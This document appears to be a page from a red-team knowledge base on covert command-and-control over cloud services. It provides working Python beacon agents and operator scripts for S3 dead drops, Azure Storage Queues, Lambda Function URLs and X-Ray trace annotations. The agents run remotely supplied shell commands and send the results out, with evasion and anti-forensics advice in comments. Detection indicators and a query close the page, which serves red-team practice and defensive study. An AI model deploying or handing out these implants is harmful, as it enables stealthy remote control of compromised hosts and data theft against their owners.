# Cloud-Native C2 Channels -- Living Off the Cloud

**MITRE ATT&CK**: T1102 - Web Service, T1071.001 - Application Layer Protocol: Web Protocols

> **Authorized security testing only.** These code patterns are reference material for red team professionals operating under explicit written authorization.

## Overview

**Cloud-native C2** replaces attacker-owned infrastructure with legitimate cloud
services (S3, Azure Storage Queues, Lambda, X-Ray). All traffic flows to well-known
endpoints over HTTPS, making it indistinguishable from normal cloud operations at
the network layer.

## Channel Comparison

| Channel | Bandwidth | Stealth | Cost | Detection Difficulty | Latency |
|---|---|---|---|---|---|
| S3 Dead Drop | Medium | High | Low | Medium | Poll-based |
| Azure Storage Queue | Medium | High | Low | Medium | Poll-based |
| Lambda Function URL | High | Very High | Low-Med | High | Near real-time |
| X-Ray Trace C2 | Low | Very High | Free tier | Very High | Minutes |

## Channel 1: S3 Dead Drop

Agent polls an S3 object for commands, writes results to a different key. Both
sides use a shared encryption key so bucket contents are opaque blobs.

```python
"""
s3_dead_drop.py -- S3-based dead drop C2 agent.
DETECTION: CloudTrail GetObject/PutObject on paired keys at regular intervals;
S3 access logs show source IP; rhythmic GET/PUT from one principal is anomalous.
OPSEC: Use bucket in same account/region; jitter poll interval; rotate key names;
use SSE-KMS encryption to blend with bucket policy and hinder DLP.
"""
import boto3, json, time, os, random
from cryptography.fernet import Fernet

BUCKET = "legitimate-app-data-bucket"        # Use an existing bucket
CMD_KEY, RESULT_KEY = "logs/processing-queue.json", "logs/processing-results.json"
fernet = Fernet(os.environ.get("C2_KEY", Fernet.generate_key()))
s3 = boto3.client("s3")

def poll_for_commands() -> dict | None:
    # DETECTION: per-key GetObject frequency analysis reveals polling.
    # OPSEC: catch NoSuchKey silently; avoid local error logs for EDR.
    try:
        body = s3.get_object(Bucket=BUCKET, Key=CMD_KEY)["Body"].read()
        cmd = json.loads(fernet.decrypt(body))
        s3.delete_object(Bucket=BUCKET, Key=CMD_KEY)   # Reduce forensic artifacts
        return cmd
    except Exception:
        return None

def send_results(data: dict) -> None:
    # DETECTION: PutObject size/content-type mismatch flags anomaly.
    # OPSEC: Keep payloads small; chunk large exfil under plausible prefixes.
    s3.put_object(Bucket=BUCKET, Key=RESULT_KEY, Body=fernet.encrypt(json.dumps(data).encode()),
        ContentType="application/json", ServerSideEncryption="aws:kms")

def agent_loop():
    import subprocess
    while True:
        cmd = poll_for_commands()
        if cmd and "command" in cmd:
            out = subprocess.run(cmd["command"], shell=True, capture_output=True, text=True, timeout=30)
            send_results({"stdout": out.stdout[:4096], "stderr": out.stderr[:1024],
                          "returncode": out.returncode, "task_id": cmd.get("task_id")})
        time.sleep(30 + random.randint(0, 15))
```

```bash
#!/usr/bin/env bash
# Operator: post encrypted command to S3 dead drop.
# DETECTION: PutObject shows operator IP in CloudTrail.
# OPSEC: Use CloudShell or EC2 in same account so sourceIPAddress is internal.
COMMAND='{"command": "whoami && id", "task_id": "recon-001"}'
ENCRYPTED=$(echo -n "$COMMAND" | python3 -c "
from cryptography.fernet import Fernet; import sys, os
print(Fernet(os.environ['C2_KEY']).encrypt(sys.stdin.buffer.read()).decode())")
aws s3api put-object --bucket legitimate-app-data-bucket \
  --key "logs/processing-queue.json" --body <(echo -n "$ENCRYPTED") \
  --content-type "application/json" --server-side-encryption "aws:kms"
```

## Channel 2: Azure Storage Queue C2

Agent reads command messages from one queue, writes results to a second queue.

```python
"""
azure_queue_c2.py -- Azure Storage Queue C2 agent.
DETECTION: Storage Analytics logs every queue op with caller IP; periodic
GetMessages + PutMessage on paired queues is anomalous.
OPSEC: Name queues to match app conventions (e.g., "task-processing"); use SAS
tokens scoped to two queues only; Managed Identity auth avoids embedded secrets.
"""
from azure.storage.queue import QueueClient
import json, time, os, random, subprocess

CONN = os.environ.get("AZURE_STORAGE_CONN")
cmd_q   = QueueClient.from_connection_string(CONN, "task-processing")
res_q   = QueueClient.from_connection_string(CONN, "task-results")

def poll() -> dict | None:
    # DETECTION: high-frequency polling on low-traffic queue is detectable.
    # OPSEC: visibility_timeout hides msg while processing.
    for msg in cmd_q.receive_messages(messages_per_page=1, visibility_timeout=300):
        cmd_q.delete_message(msg)
        return json.loads(msg.content)
    return None

def send(result: dict):
    # OPSEC: short time_to_live auto-deletes if operator doesn't retrieve.
    res_q.send_message(json.dumps(result), time_to_live=3600)

def agent_loop():
    while True:
        cmd = poll()
        if cmd and "command" in cmd:
            out = subprocess.run(cmd["command"], shell=True, capture_output=True, text=True, timeout=30)
            send({"stdout": out.stdout[:4096], "stderr": out.stderr[:1024], "task_id": cmd.get("task_id")})
        time.sleep(25 + random.randint(0, 10))
```

## Channel 3: Lambda Function URL C2 (HazyBeacon-Style)

Agent beacons to a Lambda Function URL via HTTPS POST -- indistinguishable from
any API call to `*.lambda-url.*.on.aws`.

```python
"""
lambda_c2_handler.py -- Lambda Function URL handler (server-side).
DETECTION: CloudTrail Lambda:InvokeFunction from unexpected IPs at regular intervals;
DynamoDB read/write correlated with Lambda invocations.
OPSEC: Disable X-Ray; use generic function name; Function URL domain is trusted by
most corporate proxies and TLS inspectors.
"""
import json, boto3, time
dynamodb = boto3.resource("dynamodb")
table = dynamodb.Table("webhook-tasks")

def lambda_handler(event, context):
    body = json.loads(event.get("body", "{}"))
    agent_id = body.get("agent_id", "unknown")
    if "results" in body:
        table.put_item(Item={"pk": f"result#{agent_id}", "sk": str(int(time.time())),
                             "data": body["results"], "ttl": int(time.time()) + 86400})
    resp = table.get_item(Key={"pk": f"cmd#{agent_id}", "sk": "pending"})
    if "Item" in resp:
        table.delete_item(Key={"pk": f"cmd#{agent_id}", "sk": "pending"})
        return {"statusCode": 200, "body": json.dumps({"command": resp["Item"]["data"]})}
    return {"statusCode": 200, "body": json.dumps({"command": None})}
```

```python
"""
lambda_c2_agent.py -- Beacon client.
OPSEC: Traffic goes to *.lambda-url.<region>.on.aws:443 with valid Amazon TLS cert.
DETECTION: DNS queries for lambda-url domains from servers that don't normally use them.
"""
import requests, time, random, subprocess, json

LAMBDA_URL, AGENT_ID = "https://abcdef1234.lambda-url.us-east-1.on.aws/", "agent-7f3a"

def beacon(results=None):
    payload = {"agent_id": AGENT_ID}
    if results: payload["results"] = results
    return requests.post(LAMBDA_URL, json=payload, timeout=15).json().get("command")

def agent_loop():
    results = None
    while True:
        cmd = beacon(results); results = None
        if cmd:
            out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            results = {"stdout": out.stdout[:4096], "stderr": out.stderr[:1024], "rc": out.returncode}
        time.sleep(45 + random.randint(0, 20))
```

## Channel 4: AWS X-Ray Trace C2 (XRayC2)

Encode commands in X-Ray **annotations** and exfiltrate data in **trace segments**.
Very low bandwidth (~250 bytes/annotation) but extremely stealthy in environments
already using X-Ray.

```python
"""
xray_c2.py -- X-Ray trace-based C2.
DETECTION: PutTraceSegments/GetTraceSummaries from a principal that never used X-Ray;
annotation keys not matching app instrumentation; unusual segment sizes.
OPSEC: Only use where X-Ray is already active; match existing service names;
keep annotations < 250 chars to blend with normal trace data.
"""
import boto3, json, time, random, base64, secrets, subprocess

xray = boto3.client("xray")
AGENT_ID, SERVICE = "agent-7f3a", "payment-service"

def post_segment(key: str, value: str):
    # DETECTION: PutTraceSegments in CloudTrail; unknown annotation keys.
    seg = {"trace_id": f"1-{int(time.time()):08x}-{secrets.token_hex(12)}",
           "id": secrets.token_hex(8), "name": SERVICE,
           "start_time": time.time()-0.5, "end_time": time.time(),
           "annotations": {key: value}}
    xray.put_trace_segments(TraceSegmentDocuments=[json.dumps(seg)])

def poll_commands() -> str | None:
    # DETECTION: repeated GetTraceSummaries with specific annotation filter.
    resp = xray.get_trace_summaries(StartTime=time.time()-300, EndTime=time.time(),
        FilterExpression=f'annotation.agent_id = "{AGENT_ID}" AND annotation.type = "cmd"')
    for s in resp.get("TraceSummaries", []):
        for entry in s.get("Annotations", {}).get("cmd_data", []):
            v = entry.get("AnnotationValue", {}).get("StringValue", "")
            return base64.b64decode(v).decode()
    return None

def agent_loop():
    while True:
        cmd = poll_commands()
        if cmd:
            out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            post_segment("result_data", base64.b64encode(out.stdout[:200].encode()).decode()[:250])
        time.sleep(60 + random.randint(0, 30))
```

```bash
#!/usr/bin/env bash
# Operator: post command via X-Ray trace annotation.
# DETECTION: PutTraceSegments from non-application IAM principal.
# OPSEC: Use the same IAM role as the traced application.
TRACE_ID="1-$(printf '%08x' $(date +%s))-$(openssl rand -hex 12)"
SEGMENT_ID=$(openssl rand -hex 8)
CMD_B64=$(echo -n "whoami" | base64)
aws xray put-trace-segments --trace-segment-documents "{
  \"trace_id\":\"$TRACE_ID\",\"id\":\"$SEGMENT_ID\",\"name\":\"payment-service\",
  \"start_time\":$(date +%s.%N),\"end_time\":$(date +%s.%N),
  \"annotations\":{\"agent_id\":\"agent-7f3a\",\"type\":\"cmd\",\"cmd_data\":\"$CMD_B64\"}}"
```

## Why Cloud-Native C2 Works

1. **Legitimate endpoints** -- `*.amazonaws.com`, `*.blob.core.windows.net` are on
   corporate allow-lists and cannot be blocked without breaking cloud operations.
2. **Valid TLS certificates** -- issued by trusted CAs; TLS inspection sees normal HTTPS.
3. **Authenticated API calls** -- stolen or legitimate creds produce valid signatures.

## Detection Indicators

| Indicator | Channel | Source | Confidence |
|---|---|---|---|
| Periodic `GetObject`/`PutObject` on paired keys | S3 | CloudTrail | Medium |
| Rhythmic `ReceiveMessage`/`SendMessage` on paired queues | Azure Queue | Storage Analytics | Medium |
| Lambda invocations from non-app IPs | Lambda URL | CloudTrail | Medium-High |
| `PutTraceSegments` from non-traced service | X-Ray | CloudTrail | High |
| IAM principal accessing services it never used | All | CloudTrail baseline | High |

```sql
-- Detect periodic S3 polling (potential dead drop)
SELECT useridentity.arn, requestparameters.key, COUNT(*) as cnt,
  MIN(eventtime) as first, MAX(eventtime) as last
FROM cloudtrail_logs
WHERE eventsource = 's3.amazonaws.com' AND eventname IN ('GetObject','PutObject')
GROUP BY useridentity.arn, requestparameters.key HAVING cnt > 20 ORDER BY cnt DESC;
```

## Cross-References

- [IMDS Token Theft](imds-token-theft.md) -- obtaining initial credentials for C2
- [OAuth Token Abuse](oauth-token-abuse.md) -- alternative credential sources
- [AWS Initial Access Narrative](../../13-cloud-security/aws/aws-initial-access.md)
- [Cloud Persistence Techniques](../../13-cloud-security/cloud-persistence.md)

---
*Red team knowledge base -- authorized testing only.*
